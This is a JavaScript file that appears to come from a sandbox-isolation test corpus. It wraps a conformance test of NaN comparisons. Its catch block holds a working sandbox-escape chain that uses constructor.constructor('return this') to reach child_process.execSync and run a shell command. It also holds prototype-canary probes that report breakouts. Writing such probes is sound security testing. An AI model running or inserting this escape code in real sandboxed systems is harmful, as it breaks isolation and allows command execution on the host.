try {
    if (0 < Number.NaN !== false) {
        $ERROR('#1: (0 < NaN) === false');
    }
    if (1.1 < Number.NaN !== false) {
        $ERROR('#2: (1.1 < NaN) === false');
    }
    if (-1.1 < Number.NaN !== false) {
        $ERROR('#3: (-1.1 < NaN) === false');
    }
    if (Number.NaN < Number.NaN !== false) {
        $ERROR('#4: (NaN < NaN) === false');
    }
    if (Number.POSITIVE_INFINITY < Number.NaN !== false) {
        $ERROR('#5: (+Infinity < NaN) === false');
    }
    if (Number.NEGATIVE_INFINITY < Number.NaN !== false) {
        $ERROR('#6: (-Infinity < NaN) === false');
    }
    if (Number.MAX_VALUE < Number.NaN !== false) {
        $ERROR('#7: (Number.MAX_VALUE < NaN) === false');
    }
    if (Number.MIN_VALUE < Number.NaN !== false) {
        $ERROR('#8: (Number.MIN_VALUE < NaN) === false');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}